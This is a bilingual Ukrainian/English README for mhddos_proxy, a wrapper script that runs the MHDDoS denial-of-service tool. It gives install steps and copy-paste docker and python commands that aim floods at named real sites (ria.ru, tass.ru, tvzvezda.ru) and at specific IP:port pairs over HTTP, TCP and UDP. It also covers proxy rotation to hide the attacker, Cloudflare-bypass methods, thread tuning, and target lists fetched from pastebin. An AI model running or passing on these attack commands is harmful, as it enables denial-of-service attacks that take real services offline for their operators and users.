## Оновлення
- **28.03.2022** Додано табличний вивід `--table` (дуже дякую, @alexneo2003).
- **27.03.2022** 
  - Дозволено запуск методів DBG, BOMB (дякую @drew-kun за PR) та KILLER для відповідності оригінальному MHDDoS.
  - Метод DGB оновлено, проте працездатність залишається під питанням - 
    успішні запити залежать не скільки від самої реалізації, скільки від "чистоти" IP-адреси. Не можу рекомендувати до використання.
  - Метод CFB має ті самі проблеми - запит або успішний незалежно від методу, або наявна реалізація 2-ох річної давнини не здатна обійти захист. 
    Наразі не існує надійної open-source реалізації обходу захисту Cloudflare та DDoS-Guard - еффективнішим буде пошук оригінальних серверів цілі. 
  - Метод BOMB потребує значно більше RAM - зменшіть значення `-t`. Також потребує додаткових налаштувань при запуску через python - звертайтеся до [документації MHDDoS](https://github.com/MHProDev/MHDDoS).

<details>
  <summary>Раніше</summary>

  - **26.03.2022**
    - Запуск усіх обраних атак, замість випадкового вибору 
    - Зменшено використання RAM на великій кількості цілей - тепер на RAM впливає тільки параметр `-t` 
    - Додане кешування DNS і корректна обробка проблем з резолвінгом
  - **25.03.2022** Додано режим VPN замість проксі (прапорець `--vpn`) 
  - **25.03.2022** MHDDoS включено до складу репозиторію для більшого контролю над розробкою і захистом від неочікуваних змін
</details>

## Опис

Скрипт-обгортка для запуску потужного DDoS інструмента [MHDDoS](https://github.com/MHProDev/MHDDoS).

- **Не потребує VPN** - скачує і підбирає робочі проксі для атаки (доступний режим `--vpn` за бажанням)
- Атака **декількох цілей** з автоматичним балансуванням навантаження
- Використовує **різні методи для атаки**

### Неофіційний гайд - [Детальний розбір MHDDoS_proxy](https://github.com/SlavaUkraineSince1991/DDoS-for-all/blob/main/MHDDoS_proxy.md) 

## Встановлення

### Docker - найкращий варіант у більшості випадків

Встановіть і запустіть Docker

- Windows: https://docs.docker.com/desktop/windows/install/
- Mac: https://docs.docker.com/desktop/mac/install/
- Ubuntu: https://docs.docker.com/engine/install/ubuntu/

### АБО

### Python

    git clone https://github.com/porthole-ascend-cinnamon/mhddos_proxy.git
    cd mhddos_proxy
    python3 -m pip install -r requirements.txt

### Windows x64 (Python)
Завантажте і встановіть Python та Git
-  https://www.python.org/ftp/python/3.10.2/python-3.10.2-amd64.exe
-  https://github.com/git-for-windows/git/releases/download/v2.35.1.windows.2/Git-2.35.1.2-64-bit.exe

Запускаємо Git Bash

    git clone https://github.com/porthole-ascend-cinnamon/mhddos_proxy.git
    cd mhddos_proxy
    python -m pip install -r requirements.txt

Зверніть увагу, використовується саме **python** а не python3.

### Helm

https://github.com/localdotcom/mhddos-proxy-helm

## Запуск

### Docker

HTTP(S) по URL

    docker run -it --rm --pull always ghcr.io/porthole-ascend-cinnamon/mhddos_proxy https://ria.ru https://tass.ru

HTTP по IP + PORT

    docker run -it --rm --pull always ghcr.io/porthole-ascend-cinnamon/mhddos_proxy 5.188.56.124:80 5.188.56.124:3606

TCP

    docker run -it --rm --pull always ghcr.io/porthole-ascend-cinnamon/mhddos_proxy tcp://194.54.14.131:4477 tcp://194.54.14.131:22

UDP - **ТУТ ОБОВ'ЯЗКОВО VPN**

    docker run -it --rm --pull always ghcr.io/porthole-ascend-cinnamon/mhddos_proxy udp://217.175.155.100:53

### Python - усе аналогічно

    python3 runner.py https://ria.ru https://tass.ru

### Налаштування

**УСІ ПАРАМЕТРИ МОЖНА КОМБІНУВАТИ**, можна вказувати і до і після переліку цілей

Змінити навантаження - `-t XXXX` - кількість потоків, за замовчуванням - CPU * 1000

    docker run -it --rm --pull always ghcr.io/porthole-ascend-cinnamon/mhddos_proxy -t 3000 https://ria.ru https://tass.ru

Щоб переглянути інформацію про хід атаки у табличній формі, додайте прапорець `--table`

    docker run -it --rm --pull always ghcr.io/porthole-ascend-cinnamon/mhddos_proxy --table https://ria.ru https://tass.ru

Щоб переглянути інформацію про хід атаки у текстовій формі, додайте прапорець `--debug`

    docker run -it --rm --pull always ghcr.io/porthole-ascend-cinnamon/mhddos_proxy --debug https://ria.ru https://tass.ru

Змінити частоту оновлення проксі (за замовчуванням - кожні 15 хвилин) - `-p SECONDS`

    docker run -it --rm --pull always ghcr.io/porthole-ascend-cinnamon/mhddos_proxy -p 1200 https://ria.ru https://tass.ru

Цілі з віддаленого файла конфігурації - `-c https://pastebin.com/raw/95D1jjzy`

    docker run -it --rm --pull always ghcr.io/porthole-ascend-cinnamon/mhddos_proxy -c https://pastebin.com/raw/95D1jjzy

Обрати метод(и) для HTTP(S) атаки (наприклад для обходу Cloudflare) - `--http-methods CFB`  
**Цей параметр тільки в кінці** команди  
Повний список [див. тут](https://github.com/MHProDev/MHDDoS#features-and-methods).

    docker run -it --rm --pull always ghcr.io/porthole-ascend-cinnamon/mhddos_proxy https://ria.ru https://tass.ru --http-methods CFB

## Документація

    usage: runner.py target [target ...]
                     [-t THREADS] 
                     [-p PERIOD]
                     [-c URL]
                     [--table]
                     [--debug]
                     [--rpc RPC] 
                     [--http-methods METHOD [METHOD ...]]

    positional arguments:
      targets                List of targets, separated by space
    
    optional arguments:
      -h, --help             show this help message and exit
      -c, --config URL       URL to a config file (list of targets in plain text)
      -t, --threads 2000     Total number of threads to run (default is CPU * 1000)
      -p, --period 900       How often to update the proxies (default is 900)
      --table                Print log as table
      --debug                Print log as text
      --vpn                  Disable proxies to use VPN
      --rpc 2000             How many requests to send on a single proxy connection (default is 2000)
      --proxy-timeout 5      How many seconds to wait for the proxy to make a connection (default is 5)
      --http-methods GET     List of HTTP(s) attack methods to use.
                             (default is GET, POST, STRESS, BOT, PPS)
                             Refer to MHDDoS docs for available options
                             (https://github.com/MHProDev/MHDDoS)

# ENGLISH

## Intro

Wrapper script for running [MHDDoS](https://github.com/MHProDev/MHDDoS)

- **No VPN required** - automatically downloads and selects working proxies for given targets
- Support for **multiple targets** with automatic load-balancing
- Uses multiple attack methods and switches between them

## Setup

### Python

    git clone https://github.com/porthole-ascend-cinnamon/mhddos_proxy.git
    cd mhddos_proxy
    python3 -m pip install -r requirements.txt

### Windows x64 (Python)
Download and install Python and Git
-  https://www.python.org/ftp/python/3.10.2/python-3.10.2-amd64.exe
-  https://github.com/git-for-windows/git/releases/download/v2.35.1.windows.2/Git-2.35.1.2-64-bit.exe

Let's run Git Bash

    git clone https://github.com/porthole-ascend-cinnamon/mhddos_proxy.git
    cd mhddos_proxy
    python -m pip install -r requirements.txt

Note that **python** is used instead of python3.

### Docker

- Windows: https://docs.docker.com/desktop/windows/install/
- Mac: https://docs.docker.com/desktop/mac/install/
- Ubuntu: https://docs.docker.com/engine/install/ubuntu/

      docker pull ghcr.io/porthole-ascend-cinnamon/mhddos_proxy

## Running

### Docker

    docker run -it --rm --pull always ghcr.io/porthole-ascend-cinnamon/mhddos_proxy COMMAND

### Python

    python3 runner.py COMMAND

## Usage

    usage: runner.py target [target ...]
                     [-t THREADS] 
                     [-p PERIOD]
                     [-c URL]
                     [--table]
                     [--debug]
                     [--rpc RPC] 
                     [--http-methods METHOD [METHOD ...]]

    positional arguments:
      targets                List of targets, separated by space
    
    optional arguments:
      -h, --help             show this help message and exit
      -t, --threads 2000     Total number of threads to run (default is CPU * 1000)
      -c, --config URL/file  URL to remote or path to local config file (list of targets in plain text)
      -p, --period 900       How often to update the proxies (default is 900)
      --table                Print log as table
      --debug                Print log as text
      --vpn                  Disable proxies to use VPN
      --rpc 2000             How many requests to send on a single proxy connection (default is 2000)
      --proxy-timeout 5      How many seconds to wait for the proxy to make a connection (default is 5)
      --http-methods GET     List of HTTP(s) attack methods to use.
                             (default is GET, POST, STRESS, BOT, PPS)
                             Refer to MHDDoS docs for available options
                             (https://github.com/MHProDev/MHDDoS)

# Examples

    python3 runner.py https://tvzvezda.ru 5.188.56.124:9000 tcp://194.54.14.131:4477 udp://217.175.155.100:53

    docker run -it --rm --pull always ghcr.io/porthole-ascend-cinnamon/mhddos_proxy https://tvzvezda.ru 5.188.56.124:9000 tcp://194.54.14.131:4477 udp://217.175.155.100:53

Target specification

- HTTP(S) by URL - `https://tvzvezda.ru` or `http://tvzvezda.ru`
- HTTP by IP:PORT - `5.188.56.124:9000`
- TCP by IP:PORT - `tcp://194.54.14.131:4477`
- UDP by IP:PORT - `udp://217.175.155.100:53` - **REQUIRES VPN**

Increase load

    python3 runner.py -t 3000 https://tvzvezda.ru

Change proxy update interval

    python3 runner.py -p 900 https://tvzvezda.ru

Specific HTTP(S) attack method(s)

    python3 runner.py https://tvzvezda.ru --http-methods CFB CFBUAM

## TODO
- [ ] Skip HTTP(S) proxies download for pure TCP workloads
